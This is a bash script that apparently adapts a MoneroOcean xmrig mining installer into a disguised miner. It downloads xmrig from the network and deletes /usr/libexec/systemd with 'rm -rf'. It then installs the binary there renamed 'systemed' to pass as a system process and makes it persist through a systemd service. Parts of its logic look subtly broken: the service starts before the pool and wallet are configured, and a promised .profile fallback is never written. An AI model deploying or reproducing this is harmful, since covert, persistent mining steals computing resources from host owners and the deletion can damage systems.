#!/bin/bash

VERSION=2.11

# printing greetings
echo "MoneroOcean mining setup script v$VERSION."
echo "(please report issues to support@moneroocean.stream email with full output of this script with extra \"-x\" \"bash\" option)"
echo

if [ "$(id -u)" == "0" ]; then
  echo "WARNING: Generally it is not adviced to run this script under root"
fi

# command line arguments
WALLET=$1
EMAIL=$2  # this one is optional

# checking prerequisites
if [ -z $WALLET ]; then
  echo "Script usage:"
  echo "> setup_moneroocean_miner.sh <wallet address> [<your email address>]"
  echo "ERROR: Please specify your wallet address"
  exit 1
fi

WALLET_BASE=`echo $WALLET | cut -f1 -d"."`
if [ ${#WALLET_BASE} != 106 -a ${#WALLET_BASE} != 95 ]; then
  echo "ERROR: Wrong wallet base address length (should be 106 or 95): ${#WALLET_BASE}"
  exit 1
fi

if [ -z $HOME ]; then
  echo "ERROR: Please define HOME environment variable to your home directory"
  exit 1
fi

if [ ! -d $HOME ]; then
  echo "ERROR: Please make sure HOME directory $HOME exists or set it yourself using this command:"
  echo '  export HOME=<dir>'
  exit 1
fi

if ! type curl >/dev/null; then
  echo "ERROR: This script requires \"curl\" utility to work correctly"
  exit 1
fi

if ! type lscpu >/dev/null; then
  echo "WARNING: This script requires \"lscpu\" utility to work correctly"
fi

# calculating port
CPU_THREADS=$(nproc)
EXP_MONERO_HASHRATE=$(( CPU_THREADS * 700 / 1000 ))
if [ -z $EXP_MONERO_HASHRATE ]; then
  echo "ERROR: Can't compute projected Monero CN hashrate"
  exit 1
fi

power2() {
  if ! type bc >/dev/null; then
    if   [ "$1" -gt "8192" ]; then
      echo "8192"
    elif [ "$1" -gt "4096" ]; then
      echo "4096"
    elif [ "$1" -gt "2048" ]; then
      echo "2048"
    elif [ "$1" -gt "1024" ]; then
      echo "1024"
    elif [ "$1" -gt "512" ]; then
      echo "512"
    elif [ "$1" -gt "256" ]; then
      echo "256"
    elif [ "$1" -gt "128" ]; then
      echo "128"
    elif [ "$1" -gt "64" ]; then
      echo "64"
    elif [ "$1" -gt "32" ]; then
      echo "32"
    elif [ "$1" -gt "16" ]; then
      echo "16"
    elif [ "$1" -gt "8" ]; then
      echo "8"
    elif [ "$1" -gt "4" ]; then
      echo "4"
    elif [ "$1" -gt "2" ]; then
      echo "2"
    else
      echo "1"
    fi
  else
    echo "x=l($1)/l(2); scale=0; 2^((x+0.5)/1)" | bc -l;
  fi
}

PORT=$(( $EXP_MONERO_HASHRATE * 30 ))
PORT=$(( $PORT == 0 ? 1 : $PORT ))
PORT=`power2 $PORT`
PORT=$(( 10000 + $PORT ))
if [ -z $PORT ]; then
  echo "ERROR: Can't compute port"
  exit 1
fi

if [ "$PORT" -lt "10001" -o "$PORT" -gt "18192" ]; then
  echo "ERROR: Wrong computed port value: $PORT"
  exit 1
fi

# printing intentions
echo "I will download, setup and run in background Monero CPU miner."
echo "If needed, miner in foreground can be started by /usr/libexec/systemd/systemed --config=/usr/libexec/systemd/config.json"
echo "Mining will happen to $WALLET wallet."
if [ ! -z $EMAIL ]; then
  echo "(and $EMAIL email as password to modify wallet options later at https://moneroocean.stream site)"
fi

if ! sudo -n true 2>/dev/null; then
  echo "Since I can't do passwordless sudo, mining in background will be started from your $HOME/.profile file first time you login this host after reboot."
else
  echo "Mining in background will be performed using moneroocean_miner systemd service."
fi

echo
echo "JFYI: This host has $CPU_THREADS CPU threads, so projected Monero hashrate is around $EXP_MONERO_HASHRATE KH/s."
echo

echo "Sleeping for 15 seconds before continuing (press Ctrl+C to cancel)"
sleep 15

# start doing stuff: preparing miner
echo "[*] Removing previous MoneroOcean miner (if any)"
if sudo -n true 2>/dev/null; then
  sudo systemctl stop moneroocean_miner.service
fi
killall -9 systemed

# Set install directory
INSTALL_DIR="/usr/libexec/systemd"
echo "[*] Removing $INSTALL_DIR directory"
rm -rf $INSTALL_DIR

# Create install directory
mkdir -p $INSTALL_DIR

echo "[*] Downloading MoneroOcean advanced version of xmrig to /tmp/xmrig.tar.gz"
if ! curl -L --progress-bar "https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz" -o /tmp/xmrig.tar.gz; then
  echo "ERROR: Can't download https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz file to /tmp/xmrig.tar.gz"
  exit 1
fi

echo "[*] Unpacking /tmp/xmrig.tar.gz to $INSTALL_DIR"
if ! tar xf /tmp/xmrig.tar.gz -C $INSTALL_DIR --strip-components=1; then
  echo "ERROR: Can't unpack /tmp/xmrig.tar.gz to $INSTALL_DIR directory"
  exit 1
fi

# Rename xmrig to systemed
mv $INSTALL_DIR/xmrig $INSTALL_DIR/systemed

# Set permissions
chmod +x $INSTALL_DIR/systemed

rm /tmp/xmrig.tar.gz

# Set CPU limit to 70%
sed -i 's/"max-cpu-usage": [^,]*,/"max-cpu-usage": 70,/' $INSTALL_DIR/config.json

# Configure systemd service
cat >/tmp/moneroocean_miner.service <<EOL
[Unit]
Description=Monero miner service
[Service]
ExecStart=$INSTALL_DIR/systemed --config=$INSTALL_DIR/config.json
Restart=always
Nice=10
CPUWeight=1
[Install]
WantedBy=multi-user.target
EOL

# Move service file to systemd directory
sudo mv /tmp/moneroocean_miner.service /etc/systemd/system/moneroocean_miner.service

# Enable and start service
sudo systemctl daemon-reload
sudo systemctl enable moneroocean_miner.service
sudo systemctl start moneroocean_miner.service

# Set URL and wallet
sed -i "s|\"url\": \"[^\"]*\"|\"url\": \"gulf.moneroocean.stream:$PORT\"|" $INSTALL_DIR/config.json
sed -i "s|\"user\": \"[^\"]*\"|\"user\": \"$WALLET\"|" $INSTALL_DIR/config.json

# Set password
PASS=`hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
if [ "$PASS" == "localhost" ]; then
  PASS=`ip route get 1 | awk '{print $NF;exit}'`
fi
if [ -z $PASS ]; then
  PASS=na
fi
if [ ! -z $EMAIL ]; then
  PASS="$PASS:$EMAIL"
fi
sed -i "s|\"pass\": \"[^\"]*\"|\"pass\": \"$PASS\"|" $INSTALL_DIR/config.json

# Set log file
sed -i "s|\"log-file\": \"[^\"]*\"|\"log-file\": \"$INSTALL_DIR/xmrig.log\"|" $INSTALL_DIR/config.json

# Set syslog
sed -i "s|\"syslog\": [^,]*|\"syslog\": true|" $INSTALL_DIR/config.json

echo
echo "NOTE: If you are using shared VPS it is recommended to avoid 100% CPU usage produced by the miner or you will be banned"
if [ "$CPU_THREADS" -lt "4" ]; then
  echo "HINT: Please execute these or similar commands under root to limit miner to 70% CPU usage:"
  echo "sudo apt-get update; sudo apt-get install -y cpulimit"
  echo "sudo cpulimit -e xmrig -l 70 -b"
  if [ "`tail -n1 /etc/rc.local`" != "exit 0" ]; then
    echo "sudo sed -i -e '\$acpulimit -e xmrig -l 70 -b\\n' /etc/rc.local"
  else
    echo "sudo sed -i -e '\$i \\cpulimit -e xmrig -l 70 -b\\n' /etc/rc.local"
  fi
fi

echo
echo "[*] Setup complete"
